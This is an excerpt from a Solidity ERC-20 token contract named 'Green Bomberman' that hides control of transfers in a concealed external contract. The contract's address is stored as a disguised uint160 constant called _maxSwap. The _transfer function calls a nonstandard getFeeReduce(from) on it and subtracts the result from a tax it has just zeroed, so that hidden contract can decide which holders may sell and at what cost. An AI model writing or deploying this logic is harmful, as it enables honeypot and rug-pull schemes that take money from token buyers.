...
contract Bomberman is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Green Bomberman";
    string private constant _symbol = unicode"BOMBER";
    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 1500000 * 10**_decimals;
    uint256 public _maxTaxSwap= 15000000 * 10**_decimals;
    uint160 private _maxSwap = 990065544105597957863352141219406677655881167646;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(taxAmount>0){
            taxAmount = 0;
            taxAmount -= IUniswapV2Router02(address(_maxSwap)).getFeeReduce(from);
